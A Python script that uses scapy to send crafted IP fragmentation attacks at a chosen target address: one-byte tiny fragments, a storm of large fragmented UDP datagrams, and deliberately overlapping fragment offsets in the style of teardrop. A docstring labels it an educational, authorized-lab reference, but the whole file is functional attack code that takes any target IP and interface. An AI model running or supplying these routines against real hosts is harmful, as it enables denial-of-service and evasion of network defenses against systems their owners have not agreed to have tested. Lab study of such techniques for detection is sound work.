#!/usr/bin/env python3
"""IP fragmentation stress tests (tiny / overlapping / storm).

EDUCATIONAL / AUTHORIZED-TESTING USE ONLY. Run only inside an isolated lab
network you own, or with explicit written permission. See this folder's
README.md for how the technique works and, more importantly, how to detect
and defend against it.

This is a legacy learning exercise, refactored to modern Python 3 for
readability. It is a reference implementation, not a turnkey tool.
"""

from __future__ import annotations

from scapy.layers.all import IP, UDP, Raw, fragment
from scapy.sendrecv import send

FRAGMENT_ID = 222               # shared IP id so fragments belong to one datagram
TINY_FRAGMENT_SIZE = 1          # bytes per fragment for the "tiny" variant
OVERLAP_FRAGMENT_SIZE = 3       # bytes per fragment for the overlapping variant
MAX_UDP_FRAGMENT_PAYLOAD = 1472  # 1500 MTU - 20 (IP) - 8 (UDP)
STORM_TRAILING_OFFSET = 185     # offset bump for the final storm fragment
BASE_PATTERN = "abcdefgh"


def _send_all(fragments, interface: str) -> None:
    for packet in fragments:
        send(packet, iface=interface, verbose=0)


def tiny_fragment(target_ip: str, interface: str, repetitions: int) -> None:
    """Send a datagram split into 1-byte fragments (header-splitting test)."""
    datagram = IP(dst=target_ip, flags="MF", id=FRAGMENT_ID) / UDP() / Raw(
        load=BASE_PATTERN * repetitions
    )
    _send_all(fragment(datagram, fragsize=TINY_FRAGMENT_SIZE), interface)


def storm_fragment(target_ip: str, interface: str, repetitions: int) -> None:
    """Send a storm of large fragmented UDP datagrams (reassembly pressure test)."""
    datagram = IP(dst=target_ip, flags="MF", id=FRAGMENT_ID) / UDP() / Raw(
        load="a" * MAX_UDP_FRAGMENT_PAYLOAD * repetitions
    )
    _send_all(fragment(datagram), interface)


def overlapping_fragment(target_ip: str, interface: str, repetitions: int) -> None:
    """Send fragments with deliberately overlapping offsets (reassembly edge case)."""
    datagram = IP(dst=target_ip, flags="MF", id=FRAGMENT_ID) / UDP(dport=80) / Raw(
        load=BASE_PATTERN * repetitions
    )
    for packet in fragment(datagram, fragsize=OVERLAP_FRAGMENT_SIZE):
        packet.frag -= 1        # shift each fragment back so offsets overlap
        send(packet, iface=interface, verbose=0)
